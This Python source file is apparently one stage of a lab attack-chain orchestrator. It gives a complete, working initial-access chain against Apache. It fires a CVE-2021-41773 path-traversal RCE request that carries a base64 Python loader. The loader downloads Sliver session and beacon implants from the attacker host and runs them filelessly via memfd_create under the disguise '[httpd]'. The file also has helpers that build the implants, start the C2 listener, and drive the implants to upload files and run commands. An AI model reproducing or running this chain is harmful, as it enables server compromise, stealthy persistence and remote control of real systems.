import socket
import time
import base64
import re
from urllib.parse import urlparse
import subprocess
import sys
import os

from chainlog import log

# =============================================================================
# advanced_initial_access.py — Stealthy C2 foothold on Apache (advanced mode)
# MITRE ATT&CK:
#   T1190     – Exploit Public-Facing Application  (CVE-2021-41773 / 42013)
#   T1059.006 – Command and Scripting Interpreter: Python
#   T1620     – Reflective Code Loading             (memfd_create + execve)
#   T1036.005 – Masquerading: Match Legitimate Name (`[httpd]` argv[0])
#   T1071.001 – Application Layer Protocol: Web Protocols  (Sliver HTTP C2)
# -----------------------------------------------------------------------------
# Drops two in-memory Sliver implants on the apache target via a Base64-
# encoded Python loader delivered through CVE-2021-41773 path-traversal RCE:
#   * Session implant — real-time, used for interactive enumeration / upload
#   * Beacon implant  — 5-second async check-in, used for long-running tasks
# Both implants are anonymous file descriptors (memfd_create) and process-
# masquerade as `[httpd]` under www-data. No on-disk artefact on the target.
#
# Chain-orchestrator entrypoint: ``run(target_ip, kali_ip) -> dict`` which
# returns ``{"sliver_session": <id>, "sliver_beacon": <id>}`` for downstream
# advanced steps (advanced_webserver_post_exploit_enum / _privesc) to drive.
# =============================================================================


def is_port_open(port):
    """Check if a local port is currently in use/open on 127.0.0.1."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.connect(("127.0.0.1", port))
            return True
        except Exception:
            return False

def ensure_sliver_daemon():
    """Verify that the sliver-server daemon is active on port 31337.
    If not active, starts the daemon in the background and polls until
    the gRPC control socket is accepting connections.

    On fresh-boot containers, sliver-server can take 30-60 s to finish
    its TLS / SQLite metadata initialisation before binding :31337 --
    the previous fixed ``time.sleep(12)`` consistently raced past it,
    so subsequent ``sliver-client --rc ...`` calls connected to a not-
    yet-ready daemon and hung silently until sliver-client's internal
    12 s gRPC timeout fired, returning empty stdout. Symptom downstream
    was the listener silently failing to start.
    """
    if is_port_open(31337):
        log("[+] Sliver daemon is active.")
        return

    log("[*] Sliver daemon is not active. Starting sliver-server daemon...")
    subprocess.Popen(
        ["sliver-server", "daemon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )

    # Generous timeout: on a first-ever build the daemon has to generate
    # TLS certs + initialise the SQLite ops DB before binding :31337,
    # which can push past 90 s on slower hosts. Subsequent runs hit the
    # cached state and bind in 2-5 s, so this only costs the first cold
    # boot after `docker compose build kali`.
    DAEMON_READY_TIMEOUT = 180  # seconds
    POLL_INTERVAL        = 2
    log(f"[*] Waiting up to {DAEMON_READY_TIMEOUT} s for Sliver daemon gRPC :31337 to bind...")
    deadline = time.time() + DAEMON_READY_TIMEOUT
    while time.time() < deadline:
        if is_port_open(31337):
            elapsed = int(DAEMON_READY_TIMEOUT - (deadline - time.time()))
            log(f"[+] Sliver daemon gRPC :31337 ready after ~{elapsed} s.")
            # Brief grace period so the daemon finishes loading config /
            # ops before the first sliver-client RPC lands on it.
            time.sleep(3)
            return
        time.sleep(POLL_INTERVAL)

    raise RuntimeError(
        f"ensure_sliver_daemon: sliver-server did not bind :31337 within "
        f"{DAEMON_READY_TIMEOUT} s. Check the daemon process is alive "
        "(ps -ef | grep sliver-server) and inspect any startup errors."
    )

def ensure_sliver_client_configured():
    """Verify that sliver-client has at least one operator configuration imported.
    If not, generates a local admin config and imports it.
    """
    client_config_dir = os.path.expanduser("~/.sliver-client/configs")
    has_configs = False
    if os.path.exists(client_config_dir):
        if any(f.endswith(".cfg") for f in os.listdir(client_config_dir)):
            has_configs = True

    if not has_configs:
        log("[*] No Sliver client configuration found. Generating and importing local admin configuration...")
        gen_cmd = ["sliver-server", "operator", "--name", "admin", "--lhost", "127.0.0.1", "--permissions", "all", "--save", "/tmp/admin.cfg"]
        subprocess.run(gen_cmd, capture_output=True, text=True)
        import_cmd = ["sliver-client", "import", "/tmp/admin.cfg"]
        subprocess.run(import_cmd, capture_output=True, text=True)
        log("[+] Sliver client successfully configured with local operator config.")
    else:
        log("[+] Sliver client configuration is active.")

def ensure_sliver_listener():
    """Verify (or start + verify) the HTTP C2 listener on port 8080.

    Cold-daemon gRPC handshake on :31337 can take 12-20 s after
    ``sliver-server daemon`` boots, so the original 10 s subprocess
    timeout was firing routinely and the exception was treated as
    non-fatal: the chain advanced, sent the CVE-2021-41773 exploit,
    and then polled fruitlessly for 14 × 5 s before failing with the
    misleading "no Sliver session/beacon" error.

    We verify the listener with ``ss -ltn`` (TCP port binding on
    :8080) instead of ``sliver-client jobs``. Reason: against a cold
    daemon, ``sliver-client --rc ...`` sometimes returns empty stdout
    without erroring -- the gRPC stream gets cut before the response
    streams back, but the subprocess still exits 0. ``ss`` answers the
    only question we actually care about ("is anything listening on
    8080 inside this container?") without any gRPC round-trip and is
    bulletproof.

    Flow per attempt:
      1. ``ss -ltn`` → if :8080 already bound, done.
      2. Otherwise issue ``http -L 0.0.0.0 -l 8080`` via sliver-client
         (the only call that actually needs gRPC).
      3. Wait briefly (~2 s) for the listener thread to bind the port.
      4. ``ss -ltn`` again → if :8080 bound, done.
      5. Otherwise back off and retry (3 attempts total, 5/10 s).

    Persistent failure raises ``RuntimeError`` so the chain aborts at
    prereq time with a concrete remediation hint instead of wasting
    70 s polling for sessions that can't arrive.
    """
    SUBPROCESS_TIMEOUT = 30
    MAX_ATTEMPTS       = 3
    BACKOFF_SECS       = [5, 10]
    POST_START_WAIT    = 2

    def _is_8080_bound() -> bool:
        # ss is in iproute2; available in the kali image. The "*:8080" /
        # ":::8080" patterns cover both ipv4 / ipv6 LISTEN lines.
        try:
            res = subprocess.run(["ss", "-ltn"], capture_output=True,
                                 text=True, timeout=5)
            return ":8080" in res.stdout
        except Exception:
            return False

    def _start_listener() -> None:
        cmd = ["sh", "-c",
               "echo 'http -L 0.0.0.0 -l 8080' > /tmp/start_listener.rc && "
               "echo 'exit'                    >> /tmp/start_listener.rc && "
               "sliver-client --rc /tmp/start_listener.rc"]
        subprocess.run(cmd, capture_output=True, text=True,
                       timeout=SUBPROCESS_TIMEOUT)

    last_err: str | None = None
    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            if _is_8080_bound():
                log("[+] Sliver HTTP listener on port 8080 is active.")
                return
            log(f"[*] Sliver HTTP listener on :8080 not bound "
                f"(attempt {attempt}/{MAX_ATTEMPTS}). Starting...")
            _start_listener()
            time.sleep(POST_START_WAIT)
            if _is_8080_bound():
                log("[+] Sliver HTTP listener on port 8080 started.")
                return
            last_err = "post-start verify: :8080 not bound in `ss -ltn`"
            log(f"[-] Listener did not bind :8080 after start "
                f"(attempt {attempt}/{MAX_ATTEMPTS})")
        except subprocess.TimeoutExpired as e:
            last_err = f"sliver-client timeout: {e}"
            log(f"[-] sliver-client timed out after {SUBPROCESS_TIMEOUT} s "
                f"(attempt {attempt}/{MAX_ATTEMPTS}); daemon gRPC slow")
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}"
            log(f"[-] unexpected listener error "
                f"(attempt {attempt}/{MAX_ATTEMPTS}): {last_err}")

        if attempt < MAX_ATTEMPTS:
            time.sleep(BACKOFF_SECS[attempt - 1])

    raise RuntimeError(
        "ensure_sliver_listener: could not bind :8080 after "
        f"{MAX_ATTEMPTS} attempts ({last_err}). "
        "Check `sliver-server daemon` is responsive "
        "(ss -ltn | grep 31337) and inspect /tmp/sliver-daemon.log."
    )

def ensure_beacon_compiled(kali_ip):
    """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
    If missing, triggers a background garble compilation via sliver-client.
    """
    # 1. Ensure real-time Session implant is compiled
    if not os.path.exists("/tmp/session_implant"):
        log(f"[*] C2 Session implant not found. Compiling targeting {kali_ip}:8080...")
        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/session_implant\nexit\n"
        rc_path = "/tmp/compile_session.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)

        cmd = ["sliver-client", "--rc", rc_path]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if "saved to /tmp/session_implant" in res.stdout or os.path.exists("/tmp/session_implant"):
                log("[+] C2 Session implant successfully compiled.")
            else:
                log(f"[-] Error compiling Session: {res.stdout}")
                sys.exit(1)
        except subprocess.TimeoutExpired:
            log("[-] Timeout: Session compilation took longer than 300 seconds.")
            sys.exit(1)
    else:
        log("[+] C2 Session implant exists at /tmp/session_implant.")

    # 2. Ensure passive Beacon implant is compiled (check-in interval set to 5 seconds for testing)
    if not os.path.exists("/tmp/beacon_implant"):
        log(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
        rc_path = "/tmp/compile_beacon.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)

        cmd = ["sliver-client", "--rc", rc_path]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if "saved to /tmp/beacon_implant" in res.stdout or os.path.exists("/tmp/beacon_implant"):
                log("[+] C2 Beacon implant successfully compiled.")
            else:
                log(f"[-] Error compiling Beacon: {res.stdout}")
                sys.exit(1)
        except subprocess.TimeoutExpired:
            log("[-] Timeout: Beacon compilation took longer than 300 seconds.")
            sys.exit(1)
    else:
        log("[+] C2 Beacon implant exists at /tmp/beacon_implant.")

def ensure_file_server():
    """Verify that the Python HTTP web server on port 8000 is active.
    If not active, starts it in /tmp to serve the compiled beacon.
    """
    if not is_port_open(8000):
        log("[*] Python delivery web server on port 8000 is not active. Starting server...")
        subprocess.Popen(
            ["python3", "-m", "http.server", "8000"],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(2)
        log("[+] Python delivery web server started on port 8000.")
    else:
        log("[+] Python delivery web server is active on port 8000.")

def build_payload(kali_ip, file_port):
    """Generate the Base64-encoded Python loader payload.
    This loader runs entirely in-memory using the memfd_create system call.
    It downloads and runs BOTH the session implant and the beacon implant in parallel,
    allowing comparative analysis. Both processes masquerade as '[httpd]' under www-data.
    """
    loader_code = f"""import urllib.request, ctypes, os, sys
try:
    libc = ctypes.CDLL(None)

    # 1. Download and execute C2 Session (real-time)
    url_sess = "http://{kali_ip}:{file_port}/session_implant"
    with urllib.request.urlopen(url_sess) as r:
        data_sess = r.read()
    fd_sess = libc.syscall(319, b'httpd_cache', 1)
    if fd_sess >= 0:
        os.write(fd_sess, data_sess)
        if os.fork() == 0:
            os.execve(f"/proc/self/fd/{{fd_sess}}", ["[httpd]"], os.environ)
            sys.exit(0)

    # 2. Download and execute C2 Beacon (5s interval)
    url_beac = "http://{kali_ip}:{file_port}/beacon_implant"
    with urllib.request.urlopen(url_beac) as r:
        data_beac = r.read()
    fd_beac = libc.syscall(319, b'httpd_cache', 1)
    if fd_beac >= 0:
        os.write(fd_beac, data_beac)
        if os.fork() == 0:
            os.execve(f"/proc/self/fd/{{fd_beac}}", ["[httpd]"], os.environ)
            sys.exit(0)

    # CGI parent exits immediately to prevent connection hangs
    print("Content-Type: text/plain\\n")
    print("OK")
    sys.exit(0)
except Exception as e:
    sys.exit(1)
"""
    # Base64 encode the loader script
    b64_bytes = base64.b64encode(loader_code.encode('utf-8'))
    return b64_bytes.decode('utf-8')

def fire_exploit(target_url, kali_ip, file_port=8000):
    """Send the Apache RCE exploit containing the fileless Python loader payload."""
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    b64_payload = build_payload(kali_ip, file_port)
    payload = f"echo {b64_payload} | base64 -d | python3"
    path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{payload}"
    )

    log(f"[*] Sending fileless C2 exploit to {host}:{port}{path}")

    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.sendall(request.encode())
        response = s.recv(4096).decode('utf-8', errors='ignore')
        if "200 OK" in response or "OK" in response:
            log("[+] Target executed the payload successfully (HTTP 200).")
        else:
            log(f"[-] Exploit response: {response.splitlines()[0] if response else 'No response'}")
    except Exception as e:
        log(f"[-] Error sending exploit: {e}")
    finally:
        if s is not None:
            s.close()

def check_sliver_session():
    """Run sliver-client to query both sessions and beacons."""
    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'beacons' >> /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return res.stdout
    except Exception as e:
        log(f"[-] Error checking Sliver sessions/beacons: {e}")
        return ""

def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
    """Orchestrate the entire initial access simulation."""
    target_url = f"http://{target_ip}"

    # 0. Check and satisfy all C2 server prerequisites
    log("[*] Checking C2 orchestration prerequisites...")
    ensure_sliver_daemon()
    ensure_sliver_client_configured()
    ensure_sliver_listener()
    ensure_beacon_compiled(kali_ip)
    ensure_file_server()
    log("[+] All C2 prerequisites are satisfied.")

    # 1. Fire the exploit
    fire_exploit(target_url, kali_ip, file_port)

    # 2. Wait and poll for the sessions/beacons in Sliver
    log("[*] Waiting for Sliver C2 check-ins (polling every 5s)...")
    for attempt in range(1, 15):
        time.sleep(5)
        output = check_sliver_session()
        # Look for any active connections/beacons in Sliver's output
        if "linux" in output.lower() or "active" in output.lower():
            lines = output.splitlines()
            matches = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
            if matches:
                log("[+] Success! Active C2 connection(s) detected in Sliver:")
                for m in matches:
                    log(f"    {m}")
                return True
        log(f"[*] Attempt {attempt}/14: No C2 check-ins yet...")

    log("[-] Timeout: Sliver connections failed to establish.")
    return False


# ---------------------------------------------------------------------------
# Chain-orchestrator entrypoint + helpers reused by downstream advanced steps
# ---------------------------------------------------------------------------

# Sliver renders `sessions` / `beacons` as ASCII tables; the header row starts
# with "ID  Name  Transport ...". Each data row's first whitespace-delimited
# token is the short hex ID we pass to `use <id>`. The regex is permissive
# (just needs `ID` followed by a capitalised column name) so it survives
# minor Sliver version drift -- recent versions added the Name column between
# ID and Transport.
_SESSION_HEADER_RE = re.compile(r"^\s*ID\s+[A-Z][A-Za-z]+")


def _parse_first_id(sliver_output: str) -> str | None:
    """Extract the first session/beacon name from a sliver-client table.

    Returns the first data-row's first token, or ``None`` if no table was
    rendered. Skips header, divider, and blank lines.
    """
    saw_header = False
    for line in sliver_output.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            # End of the table -- no data rows present.
            return None
        if set(stripped) <= set("= "):
            # Divider row ('====  =========  ...').
            continue
        return stripped.split()[0]
    return None


def _list_sliver(query: str, timeout: int = 10) -> str:
    """Run sliver-client with one command (``sessions`` or ``beacons``)."""
    rc_path = f"/tmp/list_{query}.rc"
    with open(rc_path, "w") as f:
        f.write(f"{query}\nexit\n")
    try:
        res = subprocess.run(
            ["sliver-client", "--rc", rc_path],
            capture_output=True, text=True, timeout=timeout,
        )
        return res.stdout
    except Exception as e:
        log(f"[-] _list_sliver({query!r}) failed: {e}")
        return ""


def sliver_exec(implant_id: str, *commands: str, timeout: int = 30) -> str:
    """Drive a Sliver implant: ``use <id>`` followed by each command, then ``exit``.

    Reused by advanced_webserver_post_exploit_enum and advanced_webserver_privesc.
    Returns the captured sliver-client stdout; caller is responsible for any
    parsing (per-command output is interleaved without a clean delimiter).
    """
    rc_path = "/tmp/sliver_exec.rc"
    with open(rc_path, "w") as f:
        f.write(f"use {implant_id}\n")
        for cmd in commands:
            f.write(f"{cmd}\n")
        f.write("exit\n")
    try:
        res = subprocess.run(
            ["sliver-client", "--rc", rc_path],
            capture_output=True, text=True, timeout=timeout,
        )
        return res.stdout
    except subprocess.TimeoutExpired:
        log(f"[-] sliver_exec(use {implant_id}, …) timed out after {timeout}s")
        return ""
    except Exception as e:
        log(f"[-] sliver_exec(use {implant_id}, …) failed: {e}")
        return ""


def sliver_upload(implant_id: str, local_path: str, remote_path: str,
                  *, overwrite: bool = True, chmod: str | None = None,
                  timeout: int = 30) -> str:
    """Upload a local file to the implant's host via Sliver.

    Wraps :func:`sliver_exec` so callers don't have to remember Sliver's
    ``upload`` flag conventions:
      * ``-o`` / ``--overwrite`` is required when the remote file exists,
        otherwise Sliver returns ``FailedPrecondition``. Defaults to True
        because every chain step that re-runs needs to replace prior drops.
      * ``-o`` here is the *upload* flag, NOT to be confused with
        ``execute -o`` (capture-output) -- a subtle Sliver naming clash.

    If ``chmod`` is provided the helper also issues a follow-up
    ``execute -o chmod <mode> <remote>`` so the remote file lands with the
    expected mode (Sliver uploads default to 0644 which isn't executable).
    """
    flag = "-o " if overwrite else ""
    cmds = [f"upload {flag}{local_path} {remote_path}"]
    if chmod is not None:
        cmds.append(f"execute -o chmod {chmod} {remote_path}")
    return sliver_exec(implant_id, *cmds, timeout=timeout)


def run(target_ip: str, kali_ip: str = "10.10.0.2", file_port: int = 8000) -> dict:
    """Chain-orchestrator entrypoint.

    Establishes the fileless Sliver Session + Beacon on the apache target and
    returns their IDs so downstream advanced steps (post_exploit_enum,
    privesc) can drive them via :func:`sliver_exec`.

    Raises:
        RuntimeError: if the implants never call back or never appear in the
                      sliver-client sessions/beacons tables.
    """
    success = deploy_fileless_c2(target_ip, kali_ip, file_port=file_port)
    if not success:
        raise RuntimeError("advanced exploit returned no Sliver session/beacon")

    sess_id = _parse_first_id(_list_sliver("sessions"))
    beac_id = _parse_first_id(_list_sliver("beacons"))
    if not sess_id:
        raise RuntimeError("advanced exploit: session implant did not appear in Sliver")
    log(f"[+] Sliver Session ID: {sess_id}")
    if beac_id:
        log(f"[+] Sliver Beacon ID:  {beac_id}")
    else:
        log("[!] Sliver Beacon not visible yet -- downstream steps may need a brief wait")
    return {
        "sliver_session": sess_id,
        "sliver_beacon":  beac_id,
    }


if __name__ == "__main__":
    target = "10.10.0.3"
    kali = "10.10.0.2"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        kali = sys.argv[2]

    deploy_fileless_c2(target, kali)
